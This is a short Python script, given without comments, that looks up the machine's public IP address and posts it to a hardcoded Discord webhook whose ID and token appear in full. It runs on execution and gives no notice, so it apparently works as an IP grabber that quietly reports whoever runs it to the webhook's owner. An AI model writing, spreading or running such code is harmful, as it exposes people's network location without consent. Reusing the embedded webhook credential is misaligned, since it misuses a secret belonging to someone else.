import requests

def send_to_discord(webhook_url, content):
    data = {
        "content": content
    }
    response = requests.post(webhook_url, data=data)
    return response.status_code

def get_ip():
    response = requests.get('https://api.ipify.org?format=json')
    ip_info = response.json()
    return ip_info

def main():
    webhook_url = 'https://discord.com/api/webhooks/1243998916026831043/Vhhv-m25PgiSF14Gxo-Uiw0dKXiPeEOn9D1-18oupWFjPfzOgaQTUrkRfbhsIuZTVJYI'
    ip_info = get_ip()
    send_to_discord(webhook_url, str(ip_info))

main()